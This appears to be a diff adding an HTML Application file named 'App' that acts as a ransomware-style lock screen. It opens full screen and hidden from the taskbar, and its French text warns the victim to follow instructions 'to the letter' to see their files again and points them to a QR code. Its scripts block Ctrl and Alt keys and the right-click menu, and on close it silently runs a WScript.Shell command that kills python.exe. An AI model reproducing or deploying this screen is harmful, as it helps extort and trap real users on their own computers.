@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>App</title>
+<hta:application id="fullscreenImage" size="fullscreen" applicationname="BSOD" showintaskbar="no" windowstate="maximize" resizable="yes" version="2.0" maximizebutton="yes" minimizebutton="yes" sysmenu="yes" caption="yes" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+			z-index: -1;
+        }
+		img {
+		position: relative;
+		left: 500px;
+		}
+
+#Hello {
+  margin-top: 10px;
+  padding: 15px 50px;
+  background-color: transparent;
+  color: White;
+  Font-family: Elephant;
+  border: none;
+  font-size: 22px;
+  border-radius: 15px;
+  position: fixed;
+  top: 5%;
+  left: 5%;
+  display: inline-flex;
+  align-items: center;
+   text-shadow: black;
+}
+
+
+
+
+    </style>
+</head>
+<body>
+		<img id="background-image" src="Lock.jpeg" alt="" width="100" height="100">
+    <div id="output-container">
+        <div id="output"></div>
+    </div>
+<button id="Hello">Contrôlez votre PC à distance en un clic<br>Si vous souhaitez les revoir un jour, suivez les instructions à la lettre:
+<br> <br> 1)Scannez le Qr code à l'aide d'un appareil et suivez les instructions
+</button>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+<img src="qrcode.png">
+  </style>
+    <script type="text/javascript">
+    window.document.onkeydown = function () {
+      // Capture des combinaisons avec Ctrl ou Alt
+      if (event.ctrlKey || event.altKey) {
+        // Empêcher le comportement par défaut
+        event.returnValue = false;
+        event.cancel = true;
+      }
+    }
+  </script>
+<script type="text/javascript">
+    window.document.oncontextmenu = function () {
+        return false; // Cela empêche le menu contextuel de s'afficher
+    }
+</script>
+  <script type="text/javascript">
+        function closeHandler() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("cmd.exe /c taskkill /f /im python.exe", 0, true);
+            } catch (e) {
+                alert("Erreur lors de l'exécution de la commande : " + e.message);
+            }
+        }
+        window.onunload = closeHandler;
+    </script>
